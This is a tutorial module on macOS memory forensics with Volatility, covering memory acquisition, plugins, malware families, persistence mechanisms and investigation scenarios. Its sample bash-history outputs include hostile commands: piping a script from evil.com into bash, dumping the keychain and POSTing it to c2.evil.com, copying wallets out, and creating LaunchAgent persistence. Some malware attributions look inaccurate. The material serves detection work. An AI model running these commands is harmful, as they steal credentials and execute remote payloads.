# macOS Memory Forensics with Volatility

## Why macOS Memory Forensics?

**Growing macOS threat landscape:**
- **Corporate environments**: 23% of enterprise endpoints run macOS (Jamf 2024)
- **High-value targets**: Developers, executives, creative professionals
- **False sense of security**: "Macs don't get viruses" (outdated myth)
- **Sophisticated threats**: State-sponsored APTs targeting macOS (Lazarus Group, APT32)

**macOS-specific malware families:**
- XCSSET (Xcode project infection)
- Silver Sparrow (M1-native malware)
- Shlayer (adware installer)
- OSX.Pirrit (adware)
- RustBucket (North Korean APT)
- MacStealer (infostealer targeting cryptocurrency wallets)

## macOS Memory Acquisition

### osxpmem (Rekall Memory Forensics)

**What is osxpmem?**
- Kernel extension (kext) for macOS memory acquisition
- Works on macOS 10.10+ (including Big Sur, Monterey, Ventura)
- Requires SIP (System Integrity Protection) to be disabled on modern macOS

**Installation:**
```bash
# Download osxpmem
curl -L https://github.com/google/rekall/releases/download/v1.5.1/osxpmem-2.1.post4.zip -o osxpmem.zip
unzip osxpmem.zip

# macOS 10.13+ requires SIP disabled
# CAUTION: Disabling SIP reduces system security
# Reboot to Recovery Mode (Cmd+R), then:
csrutil disable
reboot
```

**Basic Acquisition:**
```bash
# Acquire memory to file
sudo osxpmem.app/osxpmem -o memory.aff4

# Alternative: Raw format
sudo osxpmem.app/osxpmem --format raw -o memory.raw

# Verify acquisition
ls -lh memory.aff4
# Expected: 8GB+ file (depends on RAM size)
```

**Modern macOS Challenges:**
- **SIP (System Integrity Protection)**: Blocks kernel extensions
- **Apple Silicon (M1/M2)**: Limited tooling support
- **T2 Security Chip**: Hardware-level encryption

### Alternative: MacMemoryReader

**Lightweight acquisition tool:**
```bash
# Download from GitHub
git clone https://github.com/jipegit/OSXAuditor
cd OSXAuditor

# Run as root
sudo ./MacMemoryReader

# Output: memory.dump (raw format)
```

**Advantages:**
- No kernel extension required (uses vm_read API)
- Works with SIP enabled (limited access)
- Compatible with Apple Silicon (M1/M2)

**Limitations:**
- Cannot access kernel memory (user-space only)
- May miss kernel rootkits

## macOS Volatility Plugins

### Category 1: Process Analysis

#### mac.pslist.PsList
**Purpose**: List all running processes

**Command:**
```bash
vol -f memory.aff4 mac.pslist.PsList
```

**Output Columns:**
- PID - Process ID
- PPID - Parent process ID
- Name - Process name
- Path - Full executable path
- Start Time - When process started

**Example Output:**
```
PID     PPID    Name                    Path
1       0       launchd                 /sbin/launchd
200     1       UserEventAgent          /usr/libexec/UserEventAgent
1234    1       suspicious.app          /tmp/.hidden/suspicious.app
5678    1       Finder                  /System/Library/CoreServices/Finder.app
```

**Red Flags:**
- Processes in /tmp or /private/tmp (temporary locations)
- Processes in hidden directories (.hidden, .config)
- Misspelled system processes (Findre instead of Finder)
- Processes with unusual paths (/Users/Shared, /Library/LaunchDaemons)

#### mac.pstree.PsTree
**Purpose**: Show process hierarchy

**Command:**
```bash
vol -f memory.aff4 mac.pstree.PsTree
```

**Example:**
```
launchd (1)
├── UserEventAgent (200)
├── loginwindow (300)
│   └── Finder (5678)
│       └── Terminal (6789)
│           └── bash (7890)
│               └── malware.sh (8901) - Suspicious script
└── suspicious.app (1234) - Orphaned (should not be child of launchd)
```

### Category 2: Network Analysis

#### mac.netstat.Netstat
**Purpose**: Show network connections

**Command:**
```bash
vol -f memory.aff4 mac.netstat.Netstat
```

**Output:**
```
Proto   Local Address           Foreign Address         State           PID/Program
TCP     192.168.1.100:49152     93.184.216.34:443       ESTABLISHED     1234/suspicious.app
TCP     127.0.0.1:5000          127.0.0.1:49200         ESTABLISHED     5678/Python
UDP     0.0.0.0:5353            0.0.0.0:0               LISTENING       200/mDNSResponder
```

**Red Flags:**
- Connections to unusual IPs (non-Apple, non-Google)
- High-numbered ports (4444, 31337, 12345)
- Processes with unexpected network activity (TextEdit with network connection)
- Connections to known C2 domains

### Category 3: File System Analysis

#### mac.lsof.Lsof
**Purpose**: List open files and network sockets

**Command:**
```bash
vol -f memory.aff4 mac.lsof.Lsof
```

**What it shows:**
- Open files (documents, executables, libraries)
- Network connections (TCP/UDP sockets)
- Pipes and IPC mechanisms
- Deleted files still in memory

**Example:**
```
PID     FD      Type    Details
1234    3       REG     /tmp/malware (deleted) - Malware deleted itself
1234    4       SOCK    192.168.1.100:443 -> 93.184.216.34:4444
5678    5       REG     /Users/victim/Library/LaunchAgents/com.malware.plist
```

### Category 4: Bash History

#### mac.bash.Bash
**Purpose**: Extract bash command history from memory

**Command:**
```bash
vol -f memory.aff4 mac.bash.Bash
```

**Example Output:**
```
PID     Process         CommandTime             Command
7890    bash           2024-01-18 14:30:00      curl -s http://evil.com/payload.sh | bash
7890    bash           2024-01-18 14:31:00      chmod +x /tmp/miner
7890    bash           2024-01-18 14:32:00      /tmp/miner --url pool.minexmr.com:4444
```

**Red Flags:**
- curl/wget downloading scripts and piping to bash
- chmod +x on files in /tmp
- Python -c with base64 encoded commands (obfuscation)
- History manipulation: history -c, rm ~/.bash_history

## macOS-Specific Malware Detection

### Threat 1: Adware (Most Common)

**Common Families:**
- **Shlayer**: Fake Flash Player updates
- **OSX.Pirrit**: Injected ads and browser hijacking
- **Bundlore**: Bundled with pirated software

**Detection:**
```bash
# Find adware processes
vol -f memory.aff4 mac.pslist.PsList | grep -i "adware\|shlayer\|pirrit"

# Check for browser extensions
vol -f memory.aff4 mac.bash.Bash | grep -i "safari\|chrome\|extension"

# Example:
# bash: defaults write ~/Library/Preferences/com.apple.Safari.plist
# bash: cp malicious_extension.safariextz ~/Library/Safari/Extensions/
```

**IOCs:**
- Processes in /Library/Application Support/
- LaunchAgents with random names (com.xyz.agent.plist)
- Browser processes with unusual command-line arguments

### Threat 2: Cryptocurrency Miners

**Detection:**
```bash
# Find miner processes
vol -f memory.aff4 mac.pslist.PsList | grep -i "xmrig\|miner\|cpuminer"

# Check bash history
vol -f memory.aff4 mac.bash.Bash | grep -i "mining\|pool\|monero"

# Example:
# bash: curl -s https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-macos-x64.tar.gz | tar xz
# bash: ./xmrig --url pool.supportxmr.com:443
```

**IOCs:**
- High CPU usage (99% sustained)
- Connections to mining pools (ports 3333, 4444, 5555)
- Processes with mining-related names

### Threat 3: Infostealers

**MacStealer (2023 threat):**
```bash
# Targets:
# - Password keychains (Keychain.app)
# - Cryptocurrency wallets (Electrum, Exodus, Coinomi)
# - Browser cookies and credentials
# - iCloud tokens

# Detection:
vol -f memory.aff4 mac.bash.Bash | grep -i "keychain\|wallet\|cookie"

# Example:
# bash: security dump-keychain ~/Library/Keychains/login.keychain-db
# bash: cp -r ~/Library/Application\ Support/Coinomi /tmp/exfil/
```

### Threat 4: Backdoors and RATs

**OSX.Bella (Lazarus Group):**
```bash
# Backdoor capabilities:
# - Remote shell access
# - File upload/download
# - Screenshot capture
# - Keylogging

# Detection:
vol -f memory.aff4 mac.netstat.Netstat | grep ESTABLISHED

# Example:
# TCP 192.168.1.100:49152 -> 93.184.216.34:443 ESTABLISHED (com.apple.update)
```

**Red Flags:**
- Process names impersonating Apple services (com.apple.update, AppleUpdate)
- Outbound HTTPS connections from non-browser processes
- LaunchDaemons with Apple-like names (com.apple.systemd.plist)

## macOS Persistence Mechanisms

### 1. LaunchAgents (User-Level)
**Location**: ~/Library/LaunchAgents/

**Purpose**: Run malware when user logs in

**Detection:**
```bash
vol -f memory.aff4 mac.bash.Bash | grep LaunchAgents

# Example:
# bash: cat > ~/Library/LaunchAgents/com.malware.plist << EOF
# <?xml version="1.0" encoding="UTF-8"?>
# <plist version="1.0">
#   <dict>
#     <key>Label</key>
#     <string>com.malware</string>
#     <key>ProgramArguments</key>
#     <array>
#       <string>/tmp/malware.sh</string>
#     </array>
#     <key>RunAtLoad</key>
#     <true/>
#   </dict>
# </plist>
# EOF
# bash: launchctl load ~/Library/LaunchAgents/com.malware.plist
```

**IOCs:**
- Random plist filenames (com.xyz.agent.plist)
- Plist files pointing to /tmp or /private/tmp
- Recently modified plist files (check timestamps)

### 2. LaunchDaemons (System-Level)
**Location**: /Library/LaunchDaemons/

**Purpose**: Run malware as root at system startup

**Requires**: Root privileges to install

**Detection:**
```bash
vol -f memory.aff4 mac.bash.Bash | grep LaunchDaemons

# Example:
# bash: sudo cp com.malware.plist /Library/LaunchDaemons/
# bash: sudo launchctl load /Library/LaunchDaemons/com.malware.plist
```

### 3. Login Items
**Purpose**: Run applications at user login

**Detection:**
```bash
# Stored in: ~/Library/Preferences/com.apple.loginitems.plist
vol -f memory.aff4 mac.bash.Bash | grep loginitems

# Example:
# bash: osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Applications/Malware.app", hidden:true}'
```

### 4. Browser Extensions
**Purpose**: Inject ads, steal credentials, redirect searches

**Detection:**
```bash
# Safari: ~/Library/Safari/Extensions/
# Chrome: ~/Library/Application Support/Google/Chrome/Default/Extensions/

vol -f memory.aff4 mac.bash.Bash | grep -i "extension\|plugin"
```

### 5. Dylib Hijacking
**Purpose**: Load malicious library instead of legitimate one

**How it works:**
```bash
# macOS looks for libraries in this order:
# 1. @rpath (relative path)
# 2. @executable_path/../Frameworks
# 3. /usr/lib
# 4. /usr/local/lib

# Attacker places malicious dylib in @rpath location
# Legitimate app loads malicious dylib instead of expected one
```

**Detection:**
```bash
vol -f memory.aff4 mac.lsof.Lsof | grep "\.dylib"

# Look for dylibs in unusual locations:
# - /tmp/evil.dylib
# - /Users/Shared/evil.dylib
```

## macOS C2 Frameworks

### Empire (PowerShell Empire)

**macOS Agent:**
- Python-based agent
- Uses HTTPS for C2 communication
- Supports in-memory execution

**Detection:**
```bash
vol -f memory.aff4 mac.bash.Bash | grep -i "empire\|powershell"
vol -f memory.aff4 mac.netstat.Netstat | grep ":443"

# Example:
# Python: base64-encoded Empire stager
# Network: HTTPS connection to C2 server
```

### Metasploit Meterpreter

**macOS Meterpreter:**
```bash
# Payloads:
# - python/meterpreter/reverse_tcp
# - python/meterpreter/reverse_https

# Detection:
vol -f memory.aff4 mac.bash.Bash | grep -i "meterpreter\|msf\|payload"
```

### Sliver C2

**Modern C2 framework (Go-based):**
```bash
# Implant: Compiled Go binary
# C2: mTLS encrypted (hard to detect without process analysis)

# Detection:
vol -f memory.aff4 mac.pslist.PsList | grep -i "sliver"
vol -f memory.aff4 mac.netstat.Netstat | grep "ESTABLISHED"
```

## Practical macOS Forensics Workflow

### Scenario 1: Suspected Adware Infection

**Analysis:**
```bash
# Step 1: List all processes
vol -f memory.aff4 mac.pslist.PsList > processes.txt

# Step 2: Find suspicious processes
cat processes.txt | grep -i "/Library/Application Support\|/tmp\|/private/tmp"

# Step 3: Check LaunchAgents
vol -f memory.aff4 mac.bash.Bash | grep LaunchAgents

# Example findings:
# Process: /Library/Application Support/MacHelper/helper
# LaunchAgent: ~/Library/LaunchAgents/com.machelper.agent.plist

# Step 4: Check network connections
vol -f memory.aff4 mac.netstat.Netstat | grep "helper"
# Example: TCP connection to ad network (ads.example.com:443)
```

**Remediation:**
1. Remove LaunchAgent plist file
2. Kill malicious process
3. Delete malware files
4. Reset browser settings

### Scenario 2: Cryptocurrency Miner

**Analysis:**
```bash
# Step 1: Find bash history
vol -f memory.aff4 mac.bash.Bash > bash_history.txt

# Step 2: Search for miner downloads
cat bash_history.txt | grep -i "xmrig\|miner\|curl"

# Example:
# bash: curl -s https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-macos-x64.tar.gz | tar xz
# bash: ./xmrig --url pool.supportxmr.com:443 --user 47ABC...

# Step 3: Find miner process
vol -f memory.aff4 mac.pslist.PsList | grep xmrig
# PID 1234: /tmp/xmrig

# Step 4: Check persistence
vol -f memory.aff4 mac.bash.Bash | grep -i "launchagent\|crontab"
```

### Scenario 3: Infostealer (MacStealer)

**Analysis:**
```bash
# Step 1: Check for keychain access
vol -f memory.aff4 mac.bash.Bash | grep -i "keychain\|security"

# Example:
# bash: security dump-keychain ~/Library/Keychains/login.keychain-db > /tmp/keys.txt
# bash: curl -X POST -d @/tmp/keys.txt https://c2.evil.com/exfil

# Step 2: Check for wallet access
vol -f memory.aff4 mac.bash.Bash | grep -i "wallet\|electrum\|exodus"

# Example:
# bash: tar czf /tmp/wallets.tar.gz ~/Library/Application\ Support/Electrum/

# Step 3: Find exfiltration
vol -f memory.aff4 mac.netstat.Netstat | grep ESTABLISHED
# TCP connection to c2.evil.com:443
```

## Key Takeaways

1. **macOS is NOT immune**: Malware, adware, and APTs target macOS
2. **SIP complicates acquisition**: Modern macOS requires SIP disabled for full memory access
3. **LaunchAgents/LaunchDaemons**: Primary persistence mechanisms on macOS
4. **Bash history is crucial**: Reveals attacker commands and TTPs
5. **Adware is most common**: But sophisticated threats exist (Lazarus Group, APT32)
6. **Apple Silicon (M1/M2)**: Limited forensic tooling available

**Golden Rule**: ANY LaunchAgent/LaunchDaemon with random name or in unusual location is suspicious.

## What's Next?

- **Module 08**: Advanced kernel analysis
- **Module 09**: Timeline generation and correlation
- **Module 10**: Reporting and legal considerations

---

**References**:
- "The Mac Hacker's Handbook" by Charlie Miller and Dino Dai Zovi
- "macOS Incident Response" by Jaron Bradley
- Objective-See: https://objective-see.com/ (Mac security research)
- Patrick Wardle's research: https://www.patreon.com/patrickwardle
